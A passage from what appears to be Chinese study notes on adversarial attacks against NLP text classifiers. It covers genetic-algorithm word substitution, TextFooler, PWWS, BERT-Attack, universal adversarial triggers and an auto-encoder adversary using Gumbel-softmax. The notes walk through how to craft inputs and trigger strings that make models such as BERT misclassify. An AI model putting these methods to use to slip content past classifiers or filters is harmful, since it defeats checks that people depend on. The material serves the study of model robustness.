<p>首先选择重要性第一的recommend进行替换，选择Loss最大的advocate替换，此时虽然Loss变大，但是模型分类仍正确。</p> 
<p>之后选择重要性第二的highly进行替换，选择Loss最大的inordinately替换，此时模型分类错误。对抗样本生成成功。</p> 
<h5><a id="243_Genetic_Algorithm_evolution_and_selection_based_on_fitness_392"></a>2.4.3. Genetic Algorithm: evolution and selection based on fitness</h5> 
<p><img src="https://images2.imgbox.com/5e/cb/Ckl0ky1W_o.png" alt="在这里插入图片描述" width="600"><br> <img src="https://images2.imgbox.com/ce/f5/g0tlinpU_o.png" alt="在这里插入图片描述" width="600"></p> 
<p>step1: 将原始文本进行一次转换，将其放入被攻击模型中，计算其误分类的概率。对误分类概率进行正则化，作为父本采样的概率。</p> 
<p>step2: 对父本进行采样，由上例可以看出，采样了"We highly recommend it"和"i inordinaately recommend it"。之后对这两个父本进行融合得到新的子代 <span class="katex--inline"><span class="katex"><span class="katex-mathml"> 
     
      
       
        
        
          g 
         
        
          1 
         
        
       
      
        g_1 
       
      
    </span><span class="katex-html"><span class="base"><span class="strut" style="height: 0.625em; vertical-align: -0.1944em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right: 0.0359em;">g</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height: 0.3011em;"><span class="" style="top: -2.55em; margin-left: -0.0359em; margin-right: 0.05em;"><span class="pstrut" style="height: 2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height: 0.15em;"><span class=""></span></span></span></span></span></span></span></span></span></span>"We inordinately recommend it"。</p> 
<p>step3: 对子代进行mutation（突变），即对子代<span class="katex--inline"><span class="katex"><span class="katex-mathml"> 
     
      
       
        
        
          g 
         
        
          1 
         
        
       
      
        g_1 
       
      
    </span><span class="katex-html"><span class="base"><span class="strut" style="height: 0.625em; vertical-align: -0.1944em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right: 0.0359em;">g</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height: 0.3011em;"><span class="" style="top: -2.55em; margin-left: -0.0359em; margin-right: 0.05em;"><span class="pstrut" style="height: 2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height: 0.15em;"><span class=""></span></span></span></span></span></span></span></span></span></span>进行一次transform。（已经改变的不再改变）</p> 
<p>step4: 判断<span class="katex--inline"><span class="katex"><span class="katex-mathml"> 
     
      
       
        
        
          g 
         
        
          1 
         
        
       
      
        g_1 
       
      
    </span><span class="katex-html"><span class="base"><span class="strut" style="height: 0.625em; vertical-align: -0.1944em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right: 0.0359em;">g</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height: 0.3011em;"><span class="" style="top: -2.55em; margin-left: -0.0359em; margin-right: 0.05em;"><span class="pstrut" style="height: 2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height: 0.15em;"><span class=""></span></span></span></span></span></span></span></span></span></span>是否可以成功攻击模型，如果可以则生成成功。否则，删除<span class="katex--inline"><span class="katex"><span class="katex-mathml"> 
     
      
       
        
        
          g 
         
        
          1 
         
        
       
      
        g_1 
       
      
    </span><span class="katex-html"><span class="base"><span class="strut" style="height: 0.625em; vertical-align: -0.1944em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right: 0.0359em;">g</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height: 0.3011em;"><span class="" style="top: -2.55em; margin-left: -0.0359em; margin-right: 0.05em;"><span class="pstrut" style="height: 2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height: 0.15em;"><span class=""></span></span></span></span></span></span></span></span></span></span>的两个父本，将<span class="katex--inline"><span class="katex"><span class="katex-mathml"> 
     
      
       
        
        
          g 
         
        
          1 
         
        
       
      
        g_1 
       
      
    </span><span class="katex-html"><span class="base"><span class="strut" style="height: 0.625em; vertical-align: -0.1944em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right: 0.0359em;">g</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height: 0.3011em;"><span class="" style="top: -2.55em; margin-left: -0.0359em; margin-right: 0.05em;"><span class="pstrut" style="height: 2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height: 0.15em;"><span class=""></span></span></span></span></span></span></span></span></span></span>作为新的父本，重复step1、2、3、4直到产生成功的攻击样本。</p> 
<h3><a id="3_Examples_of_Evasion_Attacks_406"></a>3. Examples of Evasion Attacks</h3> 
<h4><a id="31_Synonym_Substitution_Attack_408"></a>3.1. Synonym Substitution Attack</h4> 
<h5><a id="311_TextFooler_410"></a>3.1.1. TextFooler</h5> 
<p>如图：</p> 
<p><img src="https://images2.imgbox.com/85/61/0CCSobr2_o.png" alt="在这里插入图片描述" width="600"></p> 
<p>该算法的架构上图比较详细，这里不再过多赘述。以下是具体的算法细节：</p> 
<p><img src="https://images2.imgbox.com/b5/4f/sIBG7Lrw_o.png" alt="在这里插入图片描述" width="900"></p> 
<blockquote> 
 <p>Jin, D., Jin, Z., Zhou, J. T., &amp; Szolovits, P. (2020). Is BERT really robust? A strong baseline for natural language attack on text classification and entailment. <em>Proceedings of the … AAAI Conference on Artificial Intelligence. AAAI Conference on Artificial Intelligence</em>, <em>34</em>(05).2020</p> 
</blockquote> 
<h5><a id="312_PWWS_424"></a>3.1.2. PWWS</h5> 
<p>如图：</p> 
<p><img src="https://images2.imgbox.com/e1/d3/hd0Zi3Xt_o.png" alt="在这里插入图片描述" width="600"></p> 
<p>该方法即考虑了LOO算法也考虑了WIR算法。但是由于没有constraint，所以生成的内容有很大的多样性。</p> 
<blockquote> 
 <p>Shuhuai Ren, Yihe Deng, Kun He, and Wanxiang Che. (2019). Generating Natural Language Adversarial Examples through Probability Weighted Word Saliency. <em>Proceedings of the 57th Annual Meeting of the Association for Computational Linguistics</em>, pages 1085–1097, Florence, Italy. Association for Computational Linguistics.</p> 
</blockquote> 
<h5><a id="313_BERTAttack_435"></a>3.1.3. BERT-Attack</h5> 
<p>如图：</p> 
<p><img src="https://images2.imgbox.com/80/06/rZ8yOnwa_o.png" alt="" width="600"></p> 
<p>该算法使用BERT作为候选样本选择的模型。</p> 
<blockquote> 
 <p>Li, L., Ma, R., Guo, Q., Xue, X., &amp; Qiu, X. (2020). BERT-ATTACK: Adversarial attack against BERT using BERT. <em>Proceedings of the 2020 Conference on Empirical Methods in Natural Language Processing (EMNLP)</em>.2020.</p> 
</blockquote> 
<h5><a id="314_Genetic_Algorithm_446"></a>3.1.4. Genetic Algorithm</h5> 
<p>如图：</p> 
<p><img src="https://images2.imgbox.com/f9/5c/0ftl7JBd_o.png" alt="" width="600"></p> 
<blockquote> 
 <p>Moustafa Alzantot, Yash Sharma, Ahmed Elgohary, Bo-Jhang Ho, Mani Srivastava, and Kai-Wei Chang. 2018. Generating Natural Language Adversarial Examples. In <em>Proceedings of the 2018 Conference on Empirical Methods in Natural Language Processing</em>, pages 2890–2896, Brussels, Belgium. Association for Computational Linguistics.</p> 
</blockquote> 
<h4><a id="32_Dicussion_455"></a>3.2. Dicussion</h4> 
<h5><a id="321_Result_and_Compare_457"></a>3.2.1. Result and Compare</h5> 
<p><img src="https://images2.imgbox.com/ab/63/AOBRkoMb_o.png" alt="在这里插入图片描述" width="600"></p> 
<p>通过上图可以看出，采用BERT进行对抗攻击可以使被攻击模型对正确类别的概率最低。同时其对原文本造成的扰动最小。则且在Query number中可以看出，BERT的时间损耗最小，Genetic Algorithm的时间损耗最高。</p> 
<blockquote> 
 <p>Li, L., Ma, R., Guo, Q., Xue, X., &amp; Qiu, X. (2020). BERT-ATTACK: Adversarial attack against BERT using BERT. <em>Proceedings of the 2020 Conference on Empirical Methods in Natural Language Processing (EMNLP)</em>.2020.</p> 
</blockquote> 
<h5><a id="322_Even_with_those_constrains_the_adversarial_samples_may_still_be_human_perceptible_466"></a>3.2.2. Even with those constrains, the adversarial samples may still be human perceptible</h5> 
<p>如图：</p> 
<p><img src="https://images2.imgbox.com/c3/77/rMa7lp4J_o.png" alt="在这里插入图片描述" width="700"></p> 
<p>在TextFooler中，对生成的对抗文本进行分析，发现在存在constraint的情况下，仍会存在一些使人“别扭”的句子。</p> 
<p>因次，论文作者提出了TF-Adjusted来加强constraint的限制</p> 
<p>TF-Adjusted: They propose a modified version of TextFooler that has stronger constrains.</p> 
<p>如图：</p> 
<p><img src="https://images2.imgbox.com/ef/ee/1BRojYbX_o.png" alt="在这里插入图片描述" width="700"></p> 
<p>可以看到，在提高了constraint后，人对生成的对抗样本的打分变高了，但是其攻击的成功率产生了断崖式下降。这就表明，在对抗样本的攻击过程中，大量样本包含了“错误”和“不合理”。</p> 
<blockquote> 
 <p>Morris, J., Lifland, E., Lanchantin, J., Ji, Y., &amp; Qi, Y. (2020). Reevaluating adversarial examples in natural language. <em>Findings of the Association for Computational Linguistics: EMNLP 2020</em>.</p> 
</blockquote> 
<h4><a id="33_Morpheus_488"></a>3.3. Morpheus</h4> 
<p>如图：</p> 
<p><img src="https://images2.imgbox.com/eb/98/RcT6iICp_o.png" alt="在这里插入图片描述" width="600"></p> 
<p>通过文法错误或者改变inflectional form（屈折形式）来对NLP模型进行攻击。因为该种错误在现实场景下十分常见。</p> 
<h4><a id="34_Universal_Trigger__Targeted_Attack_497"></a>3.4. Universal Trigger (Targeted Attack)</h4> 
<h5><a id="341_What_is_universal_trigger_499"></a>3.4.1. What is universal trigger</h5> 
<p>Universal string: A trigger string that is not related to the task but can perform targeted attack when add to the original string</p> 
<p>如图：</p> 
<p><img src="https://images2.imgbox.com/21/07/ZpsE570U_o.png" alt="在这里插入图片描述" width="800"></p> 
<p>在对原始文本加入一个通用前缀后，模型就可对其进行错误的分类。</p> 
<h5><a id="342_How_to_obtain_universal_trigger_510"></a>3.4.2. How to obtain universal trigger</h5> 
<h6><a id="step1_Determine_how_many_words_the_trigger_needs_and_initialize_them_with_some_words_512"></a>step1 Determine how many words the trigger needs and initialize them with some words</h6> 
<p><img src="https://images2.imgbox.com/c3/e1/sZHsDUk1_o.png" alt="在这里插入图片描述" width="500"></p> 
<h6><a id="step2_Bcakward_and_batain_the_gradient_of_each_trigger_words_embedding_and_find_the_token_that_minimize_the_objective_function_arg_min_i_in_Vocab_e_i__e_0_nabla_e_0_mathcalL__517"></a>step2 Bcakward and batain the gradient of each trigger word’s embedding and find the token that minimize the objective function $arg min_{i \in Vocab} (e_i - e_0) \nabla_{e_0} \mathcal{L} $</h6> 
<p>如图：</p> 
<p><img src="https://images2.imgbox.com/e0/bc/68I8LFuu_o.png" alt="在这里插入图片描述" width="600"></p> 
<p>如图，首先将设定的currentetr trigger加原文本送入模型，得到目标分类的概率。</p> 
<p>利用反向传播的Loss计算embedding space下其他单词（<span class="katex--inline"><span class="katex"><span class="katex-mathml"> 
     
      
       
        
        
          e 
         
        
          1 
         
        
       
      
        e_1 
       
      
    </span><span class="katex-html"><span class="base"><span class="strut" style="height: 0.5806em; vertical-align: -0.15em;"></span><span class="mord"><span class="mord mathnormal">e</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height: 0.3011em;"><span class="" style="top: -2.55em; margin-left: 0em; margin-right: 0.05em;"><span class="pstrut" style="height: 2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height: 0.15em;"><span class=""></span></span></span></span></span></span></span></span></span></span>、<span class="katex--inline"><span class="katex"><span class="katex-mathml"> 
     
      
       
        
        
          e 
         
        
          2 
         
        
       
      
        e_2 
       
      
    </span><span class="katex-html"><span class="base"><span class="strut" style="height: 0.5806em; vertical-align: -0.15em;"></span><span class="mord"><span class="mord mathnormal">e</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height: 0.3011em;"><span class="" style="top: -2.55em; margin-left: 0em; margin-right: 0.05em;"><span class="pstrut" style="height: 2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height: 0.15em;"><span class=""></span></span></span></span></span></span></span></span></span></span>）与当前单词<span class="katex--inline"><span class="katex"><span class="katex-mathml"> 
     
      
       
        
        
          e 
         
        
          0 
         
        
       
      
        e_0 
       
      
    </span><span class="katex-html"><span class="base"><span class="strut" style="height: 0.5806em; vertical-align: -0.15em;"></span><span class="mord"><span class="mord mathnormal">e</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height: 0.3011em;"><span class="" style="top: -2.55em; margin-left: 0em; margin-right: 0.05em;"><span class="pstrut" style="height: 2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">0</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height: 0.15em;"><span class=""></span></span></span></span></span></span></span></span></span></span>的向量差和偏微分的点集，选择Loss最小（targeted attack，所以要选择在目标类别梯度最小的<span class="katex--inline"><span class="katex"><span class="katex-mathml"> 
     
      
       
        
        
          e 
         
        
          i 
         
        
       
      
        e_i 
       
      
    </span><span class="katex-html"><span class="base"><span class="strut" style="height: 0.5806em; vertical-align: -0.15em;"></span><span class="mord"><span class="mord mathnormal">e</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height: 0.3117em;"><span class="" style="top: -2.55em; margin-left: 0em; margin-right: 0.05em;"><span class="pstrut" style="height: 2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height: 0.15em;"><span class=""></span></span></span></span></span></span></span></span></span></span>）的<span class="katex--inline"><span class="katex"><span class="katex-mathml"> 
     
      
       
        
        
          e 
         
        
          i 
         
        
       
      
        e_i 
       
      
    </span><span class="katex-html"><span class="base"><span class="strut" style="height: 0.5806em; vertical-align: -0.15em;"></span><span class="mord"><span class="mord mathnormal">e</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height: 0.3117em;"><span class="" style="top: -2.55em; margin-left: 0em; margin-right: 0.05em;"><span class="pstrut" style="height: 2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height: 0.15em;"><span class=""></span></span></span></span></span></span></span></span></span></span>作为本轮的候选单词。</p> 
<h6><a id="step3_Update_the_trigger_with_the_newly_find_words_528"></a>step3 Update the trigger with the newly find words</h6> 
<p><img src="https://images2.imgbox.com/cb/09/ZS0eqCEw_o.png" alt="在这里插入图片描述" width="400"></p> 
<p>选定所有候选单词，进行下轮计算直到攻击成功。</p> 
<h5><a id="343_Result_536"></a>3.4.3. Result</h5> 
<p>如图：</p> 
<p><img src="https://images2.imgbox.com/8f/ab/9JgkMT7q_o.png" alt="在这里插入图片描述" width="800"></p> 
<p>可以看到如上图所示的攻击成果。</p> 
<blockquote> 
 <p>Wallace, E., Feng, S., Kandpal, N., Gardner, M., &amp; Singh, S. (2019). Universal adversarial triggers for attacking and analyzing NLP. <em>Proceedings of the 2019 Conference on Empirical Methods in Natural Language Processing and the 9th International Joint Conference on Natural Language Processing (EMNLP-IJCNLP)</em>.</p> 
</blockquote> 
<h4><a id="35_Crafting_Adversaries_by_AutoEncoder_547"></a>3.5. Crafting Adversaries by Auto-Encoder</h4> 
<h5><a id="351_Train_a_generator_autoencoder_to_generate_the_adversarial_samples_549"></a>3.5.1. Train a generator (auto-encoder) to generate the adversarial samples:</h5> 
<p>如图：</p> 
<p><img src="https://images2.imgbox.com/8b/09/oNRbKVO0_o.png" alt="在这里插入图片描述" width="400"></p> 
<p>generator的目标：使Text classifier对生成的对抗样本做出错误的分类。</p> 
<p>classifier的目标：正确的对文本做出分类。</p> 
<p>训练的过程：对not robust Text Classifier（目标攻击NLP模型）和 robust Text classifier（防御模型）交替训练</p> 
<h5><a id="352_Attack_step_562"></a>3.5.2. Attack step</h5> 
<p>Attack阶段主要是由generartor生成adversarial sample，使classifier（被攻击模型）对其进行错误的分类。</p> 
<p>如图：</p> 
<p><img src="https://images2.imgbox.com/2e/f9/tawBN07F_o.png" alt="在这里插入图片描述" width="600"></p> 
<p>Attack阶段由三个Loss组成，reconstruction loss和similarity loss是保证生成的sentence与原始的sentence有相同（近似的）的语义。trconstruction loss是生成sentence和原sentence的token相近，Smiliarity loss是生成的embedding和原embedding相近。adversrial loss是模型对抗的loss，保证模型的攻击效果。在攻击阶段，text classifier（被攻击的模型）的参数是固定的。</p> 
<h5><a id="353_Defense_step_573"></a>3.5.3. Defense step</h5> 
<p>Defense阶段主要是由generator生成adversarial sample，使classifier（防御模型）对其进行正确的分类。</p> 
<p>如图：</p> 
<p><img src="https://images2.imgbox.com/9a/03/mXv73gOp_o.png" alt="在这里插入图片描述" width="600"></p> 
<p>之所以需要denfense step，是因为：如果只有attack step的话，generator可能会产生十分"别扭"的“旁门左道”来生成根本不能被正确分类的adversarial sample，这对人眼来说会十分容易辨别。因此，训练一个robust的classifier来保证生成的adversarial sample是可以被正确分类的来保证其语义的正确性。</p> 
<p>Defense阶段也由三个Loss组成，前两个Loss与Attack阶段一样，这里不再过多赘述。第三个阶段则希望robust classifier可能同时对原始的sample和生成的adversarial sample都可以进行正确的分类。</p> 
<p>**注意：**训练的过程中，attack step和defense step是交替运行的，且被攻击的not robust的classifier的参数是固定不变的。</p> 
<h5><a id="354_Problem_during_backward_cannot_directly_backward_the_sampling_in_AE_588"></a>3.5.4. Problem during backward: cannot directly backward the sampling in AE</h5> 
<p>如图：</p> 
<p><img src="https://images2.imgbox.com/c8/6d/g6CeB7GC_o.png" alt="在这里插入图片描述" width="700"></p> 
<p>我们都知道，神经网络的训练是通过对模型求偏导然后再反向传播来实现的。</p> 
<p>我们都知道，NLP生成模型的最后一步就是针对生成sentence的各个字符来进行分类，分类的类别数是vocab size。如上图，对生成的adversarial sample的第一个字符进行判断。</p> 
<p>首先，得到第一个字符的vector，vector的长度为vocab size</p> 
<p>之后，利用softmax对vector进行归一化，得到各个字符的概率分布</p> 
<p>最后，利用argmax选择概率最大的字符。如上图所示，第一个字符是’I’。</p> 
<p>重复以上步骤，直到生成完整的daversaria sample。</p> 
<p>对于一般的NLP任务，argmax是最后一步。但是，对于本问题，生成adversarial sample只是一个中间过程，且生成adversarial sample在训练的过程中需要不断的进行优化，因此该过程必须是可导的。argmax的不可导性质显然不满足这个要求，因此，需要一个新的技术来代替argmax完成字符采样这个过程，这便是：Reparameterization trick中针对离散情况的Gumbel softmax算法。</p> 
<blockquote> 
 <p>Jang, Eric, ShixiangGu, and Ben Poole. "Categorical reparameterization with gumbel-softmax."<em>arXivpreprint arXiv:1611.01144</em>(2016).</p> 
</blockquote> 
<h6><a id="3541_GumbelSoftmax_reparametrization_trick_611"></a>3.5.4.1. Gumbel-Softmax reparametrization trick</h6> 
<p>如图：</p> 
<p><img src="https://images2.imgbox.com/61/71/7fCOdNEC_o.png" alt="在这里插入图片描述" width="700"></p> 
<p>首先介绍的是Gumble Max，它提供了一种从类别分布中采样的方法</p> 
<p>假设adversarial sample的第一个字符中各个类别的概率是：<span class="katex--inline"><span class="katex"><span class="katex-mathml"> 
     
      
       
        
        
          p 
         
        
          1 
         
        
       
         , 
        
        
        
          p 
         
        
          2 
         
        
       
         , 
        
       
         . 
        
       
         . 
        
       
         . 
        
       
         , 
        
        
        
          p 
         
        
          k 
         
        
       
      
        p_1, p_2,...,p_k 
       
      
    </span><span class="katex-html"><span class="base"><span class="strut" style="height: 0.625em; vertical-align: -0.1944em;"></span><span class="mord"><span class="mord mathnormal">p</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height: 0.3011em;"><span class="" style="top: -2.55em; margin-left: 0em; margin-right: 0.05em;"><span class="pstrut" style="height: 2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height: 0.15em;"><span class=""></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right: 0.1667em;"></span><span class="mord"><span class="mord mathnormal">p</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height: 0.3011em;"><span class="" style="top: -2.55em; margin-left: 0em; margin-right: 0.05em;"><span class="pstrut" style="height: 2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height: 0.15em;"><span class=""></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right: 0.1667em;"></span><span class="mord">...</span><span class="mpunct">,</span><span class="mspace" style="margin-right: 0.1667em;"></span><span class="mord"><span class="mord mathnormal">p</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height: 0.3361em;"><span class="" style="top: -2.55em; margin-left: 0em; margin-right: 0.05em;"><span class="pstrut" style="height: 2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right: 0.0315em;">k</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height: 0.15em;"><span class=""></span></span></span></span></span></span></span></span></span></span>，那么Gubmel Max提供了一个依概率采样类别的方法：<br> <span class="katex--display"><span class="katex-display"><span class="katex"><span class="katex-mathml"> 
      
       
        
        
          a 
         
        
          r 
         
        
          g 
         
        
            
         
        
          m 
         
        
          a 
         
         
         
           x 
          
         
           i 
          
         
        
          ( 
         
        
          l 
         
        
          o 
         
        
          g 
         
        
            
         
         
         
           p 
          
         
           i 
          
         
        
          − 
         
        
          l 
         
        
          o 
         
        
          g 
         
        
          ( 
         
        
          − 
         
        
          l 
         
        
          o 
         
        
          g 
         
        
            
         
         
         
           ε 
          
         
           i 
          
         
        
          ) 
         
         
         
           ) 
          
          
          
            i 
           
          
            = 
           
          
            1 
           
          
         
           k 
          
         
        
          , 
         
        
          ε 
         
        
          ∼ 
         
        
          U 
         
        
          [ 
         
        
          0 
         
        
          , 
         
        
          1 
         
        
          ] 
         
        
       
         arg \ max_i(log \ p_i-log(-log \ \varepsilon_i ))^k_{i=1}, \varepsilon \sim U[0, 1] 
        
       
     </span><span class="katex-html"><span class="base"><span class="strut" style="height: 1em; vertical-align: -0.25em;"></span><span class="mord mathnormal">a</span><span class="mord mathnormal" style="margin-right: 0.0278em;">r</span><span class="mord mathnormal" style="margin-right: 0.0359em;">g</span><span class="mspace"> </span><span class="mord mathnormal">ma</span><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height: 0.3117em;"><span class="" style="top: -2.55em; margin-left: 0em; margin-right: 0.05em;"><span class="pstrut" style="height: 2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height: 0.15em;"><span class=""></span></span></span></span></span></span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right: 0.0197em;">l</span><span class="mord mathnormal">o</span><span class="mord mathnormal" style="margin-right: 0.0359em;">g</span><span class="mspace"> </span><span class="mord"><span class="mord mathnormal">p</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height: 0.3117em;"><span class="" style="top: -2.55em; margin-left: 0em; margin-right: 0.05em;"><span class="pstrut" style="height: 2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height: 0.15em;"><span class=""></span></span></span></span></span></span><span class="mspace" style="margin-right: 0.2222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right: 0.2222em;"></span></span><span class="base"><span class="strut" style="height: 1.1491em; vertical-align: -0.25em;"></span><span class="mord mathnormal" style="margin-right: 0.0197em;">l</span><span class="mord mathnormal">o</span><span class="mord mathnormal" style="margin-right: 0.0359em;">g</span><span class="mopen">(</span><span class="mord">−</span><span class="mord mathnormal" style="margin-right: 0.0197em;">l</span><span class="mord mathnormal">o</span><span class="mord mathnormal" style="margin-right: 0.0359em;">g</span><span class="mspace"> </span><span class="mord"><span class="mord mathnormal">ε</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height: 0.3117em;"><span class="" style="top: -2.55em; margin-left: 0em; margin-right: 0.05em;"><span class="pstrut" style="height: 2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height: 0.15em;"><span class=""></span></span></span></span></span></span><span class="mclose">)</span><span class="mclose"><span class="mclose">)</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height: 0.8991em;"><span class="" style="top: -2.453em; margin-left: 0em; margin-right: 0.05em;"><span class="pstrut" style="height: 2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">i</span><span class="mrel mtight">=</span><span class="mord mtight">1</span></span></span></span><span class="" style="top: -3.113em; margin-right: 0.05em;"><span class="pstrut" style="height: 2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right: 0.0315em;">k</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height: 0.247em;"><span class=""></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right: 0.1667em;"></span><span class="mord mathnormal">ε</span><span class="mspace" style="margin-right: 0.2778em;"></span><span class="mrel">∼</span><span class="mspace" style="margin-right: 0.2778em;"></span></span><span class="base"><span class="strut" style="height: 1em; vertical-align: -0.25em;"></span><span class="mord mathnormal" style="margin-right: 0.109em;">U</span><span class="mopen">[</span><span class="mord">0</span><span class="mpunct">,</span><span class="mspace" style="margin-right: 0.1667em;"></span><span class="mord">1</span><span class="mclose">]</span></span></span></span></span></span><br> 如上图，首先算出各个类别概率的对数<span class="katex--inline"><span class="katex"><span class="katex-mathml"> 
     
      
       
       
         l 
        
       
         o 
        
        
        
          g 
         
         
         
           p 
          
         
           i 
          
         
        
       
      
        log_{p_i} 
       
      
    </span><span class="katex-html"><span class="base"><span class="strut" style="height: 0.9805em; vertical-align: -0.2861em;"></span><span class="mord mathnormal" style="margin-right: 0.0197em;">l</span><span class="mord mathnormal">o</span><span class="mord"><span class="mord mathnormal" style="margin-right: 0.0359em;">g</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height: 0.1514em;"><span class="" style="top: -2.55em; margin-left: -0.0359em; margin-right: 0.05em;"><span class="pstrut" style="height: 2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight"><span class="mord mathnormal mtight">p</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height: 0.3281em;"><span class="" style="top: -2.357em; margin-left: 0em; margin-right: 0.0714em;"><span class="pstrut" style="height: 2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height: 0.143em;"><span class=""></span></span></span></span></span></span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height: 0.2861em;"><span class=""></span></span></span></span></span></span></span></span></span></span>，然后从均匀分布<span class="katex--inline"><span class="katex"><span class="katex-mathml"> 
     
      
       
       
         U 
        
       
         [ 
        
       
         0 
        
       
         , 
        
       
         1 
        
       
         ] 
        
       
      
        U[0,1] 
       
      
    </span><span class="katex-html"><span class="base"><span class="strut" style="height: 1em; vertical-align: -0.25em;"></span><span class="mord mathnormal" style="margin-right: 0.109em;">U</span><span class="mopen">[</span><span class="mord">0</span><span class="mpunct">,</span><span class="mspace" style="margin-right: 0.1667em;"></span><span class="mord">1</span><span class="mclose">]</span></span></span></span></span>中随机采样<span class="katex--inline"><span class="katex"><span class="katex-mathml"> 
     
      
       
       
         k 
        
       
      
        k 
       
      
    </span><span class="katex-html"><span class="base"><span class="strut" style="height: 0.6944em;"></span><span class="mord mathnormal" style="margin-right: 0.0315em;">k</span></span></span></span></span>个随机数<span class="katex--inline"><span class="katex"><span class="katex-mathml"> 
     
      
       
        
        
          ε 
         
        
          1 
         
        
       
         , 
        
        
        
          ε 
         
        
          2 
         
        
       
         , 
        
       
         . 
        
       
         . 
        
       
         . 
        
       
         , 
        
        
        
          ε 
         
        
          k 
         
        
       
      
        \varepsilon_1, \varepsilon_2,..., \varepsilon_k 
       
      
